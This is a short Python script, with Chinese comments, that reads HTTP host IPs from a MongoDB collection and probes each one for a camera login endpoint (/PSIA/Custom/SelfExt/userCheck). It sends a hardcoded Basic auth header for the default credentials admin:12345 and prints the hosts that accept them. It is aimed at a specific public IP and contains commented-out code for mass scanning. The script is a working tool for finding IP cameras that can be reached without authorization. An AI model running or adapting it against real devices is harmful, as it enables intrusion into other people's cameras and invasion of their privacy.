# coding=utf-8
import requests
import re
import pymongo

def get_http_ips(host="127.0.0.1",db='SOL',coll='Online'):
    #从mongodb中取http的ip
    ips = []
    client = pymongo.MongoClient(host=host, port=27017)
    coll = client[db][coll]
    items = coll.find({"protocol":"HTTP"})
    if items.count()>0:
        for item in items:
            ips.append(item['ip'])
    client.close()
    return ips
def main(ip):
    # 测试单个ip
    testURL = 'http://'+ip+'/PSIA/Custom/SelfExt/userCheck'
    url2 = 'http://'+ip+'/doc/page/preview.asp'
    headers = {
    #     'host': ip,
    #     'Connection': 'keep-alive',
    #     'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    #     'If-Modified-Since': "0",
        'Authorization': "Basic YWRtaW46MTIzNDU="}
  #    'Cookie':"language=zh; updateTips=true; userInfo80=YWRtaW46MTIzNDU%3D" }#admin:12345
    #     'X-Requested-With': "XMLHttpRequest",
    #     'Referer': "http://101.231.205.106/doc/page/login.asp",
    #     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2859.0 Safari/537.36'}
    # #s = requests.session()
    try:
        r = requests.get(testURL,headers=headers,timeout=2)
        print(r.text)
        if re.search('200',r.text):
            print(ip,r.text)
    except:#timeout异常导致慢
        pass
if __name__ == "__main__":
    main('175.188.188.180')#测试单个ip
    # for ip in get_http_ips():
    #     main(ip)
